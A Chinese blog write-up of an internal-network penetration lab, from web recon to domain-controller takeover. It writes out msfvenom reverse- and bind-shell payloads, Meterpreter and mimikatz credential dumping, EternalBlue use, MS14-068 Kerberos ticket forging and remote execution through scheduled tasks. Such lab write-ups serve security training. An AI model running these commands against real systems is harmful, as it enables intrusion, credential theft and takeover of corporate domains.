程序员写在文章前：

最近，程序员小星在研究内网渗透，对部分内网靶场进行了测试，所以想和大家从测试过程、检测过程以及域渗透过程这3个方面来分享一下我在打内网靶场中的经历。

## 准备工作

本次内网网络拓扑图如下所示，首先将WEB的IP 192.168.0.150改为192.168.0.3。![](../Images/3ca704ae1f080e590d7a589ad88d6849.png)

## （一）测试过程  

信息收集：

1\. 对目标IP进行端口扫描。  
sudo nmap -sS --open -Pn -p- -v 192.168.0.3

![](../Images/daa72beabfe03a60e2d4a430a6da78ba.png)

2.绑定hosts 192.168.0.3 www.webhack123.com ，访问网站首页出现一个thinkphp框架。

![](../Images/298b3bfc297e1f7996fb306e5965bc3c.png)

3.对网站进行目录扫描。

![](../Images/459bba954759dd38b8f6b1d7e2c9a47b.png)

4.存在wc.db将其下载下来，使用工具打开，里面存在网站目录文件信息，查看网站目录信息后，可以了解网站的基本架构。

![](../Images/1fc413ed90158b891083d16e168e8d17.png)

## （二）检测过程

1\. 通过前面的信息搜集，已经知道当前网站是thinkphp框架了，使用工具扫描一下常见的漏洞,发现存在日志泄漏。![](../Images/e93cc8e8d7104afa496927190951f150.png)

2.在日志中泄漏了账号和密码的密文。

账号：admin

密文：74c774ef39b5b977c1fd59dbfc73c3e380a65aa3

![](../Images/dadd0a62fda2fd86b39d0974beeddc9b.png)

3.通过解密获取密码明文web123。![](../Images/28f0d8f3824bcaf2b630d60706dea5dc.png)

4.前面对网站进行目录扫描，未发现网站管理后台，因此使用脚本来绑定 hosts 碰撞管理后台的子域名。

![](../Images/919407c2a440111e123020d7da79698a.png)

5\. admin.webhack123.com就是网站的管理后台。

![](../Images/ab5411f51eef4de83934d77e04ebda1a.png)

6.使用前面获取的管理员账号密码进行登录，可以测试发现验证码是存在缺陷，也可以使用大字典来爆破出管理员的密码。

![](../Images/5a88d4cdc4d3f48492b399fe2837241c.png)

7.进入网站后台，修改允许上传的类型，上传一句话木马。

![](../Images/d7cac2c6257f9d95e6e250300e8818d0.png)

8.使用蚁剑连接获取webshell。

![](../Images/7c0fd260227b1b572a1c95ce10fb2ccb.png)

9\. 在当前主机先进行简单的信息搜集，当前用户为administrator且主机未安装杀软，存在双网卡192.168.0.0/24 10.10.10.0/24，存在域环境。

生成攻击载荷先上线msf：

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.0.2 LPORT=9999  -f exe>haha.exe

![](../Images/4a0951f1257d2396a0adf87da5d2c300.png)

10.迁移进程获取明文密码。

migrate 600

load kiwi

creds\_all

![](../Images/345b81db5020dc59b277e8229f319c3e.png)

11.获取登录过当前主机的用户信息。

run post/windows/gather/enum\_logged\_on\_users

![](../Images/9d0ff22ce3f002dd1fc17b102e4326a4.png)

12\. 可以看到存在hackbox域的域用户web，本地管理员Administrator的密码为：!@#Qwe456

前面我们已经知道存在域环境，现在定位到域控为：dc.hackbox.com 10.10.10.149。

![](../Images/57339e4a7086dce2a37d8c558cec07b3.png)

## （三）域渗透过程

1\. 前面知道该主机存在两个网卡,现在来对这两个网段的存活主机进行扫描，首先添加：

run autoroute -s 10.10.10.0/24

run autoroute -p

![](../Images/ae22ce4f4b7dd6172c7870b2ed096837.png)

2\. 对内网存活主机进行扫描，只存在10.10.10.149，也就是域控，且开放了445端口。

![](../Images/bccd7aaf390e3eff4152be359f0d923f.png)

3.使用永恒之蓝试打，检测出存在永恒之蓝漏洞。

![](../Images/bd385801b121df2e8de74448539d0261.png)

4\. 反向shell失败原因未明，正向的shell是可以成功返回一个meterpreter，成功获取域控dc权限。  
![](../Images/bfba37ea725978e00e33ac7517903e6a.png)

5\. 测试使用MS14-068漏洞：使用这个 exp 需要一个普通域控用户， web 是域用户，但不知道密码。前面获取到用户Administrator的密码为!@#Qwe456，现尝试使用用户web和这个密码进行登录。

![](../Images/ce6e1cdb79ea1edd73dd0720ac3587b3.png)

6.登录失败，但是密码应该是正确的，只是不是远程组。

![](../Images/2274741da211f1f1c02da076f8580401.png)

7\. #创建票据

ms14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456

Load kiwi

#清理票据

kerberos\_ticket\_purge

![](../Images/cb7ce9126c4361b49d85f0c8f19f164f.png)

8.上传 mimikatz 注入票据 mimikatz # kerberos::ptc TGT\_web@hackbox.com.ccache。

![](../Images/6b148f0ec1ed1bcb7c16e8b80fc2bf39.png)

9.查看票据 klist。

![](../Images/a3bca88bfa8539b277453768ec93a161.png)

10.成功访问dc域控。

![](../Images/5a0ee582bd0ead310fec0ba6a71bc3f7.png)

11.现在来获取域控权限，生成一个正向的载荷：

msfvenom -p windows/meterpreter/bind\_tcp  LPORT=9998  -f exe>bind.exe

copy命令复制到域控copy bind.exe \\\\dc\\c$。

![](../Images/5d05a7d6f8146f4148118dbfefb90636.png)  
12\. at命令执行计划任务运行bind.exe

net time \\\\dc

at \\\\dc 1:29:00 c:/bind.ex

![](../Images/9a7c1dbab962b70bc1e6d430b04d83ae.png)

13.成功获取域控权限。  
![](../Images/6c0dd1cd135b466b408f88ea88e238f0.png)

14.迁移进程抓取明文密码。  
![](../Images/3c67aae248814012e672fd20d8f78b64.png)

15.至此已经拿下了域控的权限。

![](../Images/b583e6e0763b0f0adbbc83b0bf76f287.png)

16.迁移到域管理员进程查看三个flag。

![](../Images/bb15a02d11adf20b0d2e158788abab26.png)

## （四）总结

小星通过此次内网靶场测试的研究，加深了对内网系统的认识，熟练掌握了如何使用MSF完成整个打靶过程。下期，小星将使用Cobalstrick来完成打靶并以“黄金票据的利用”为题开展研究。
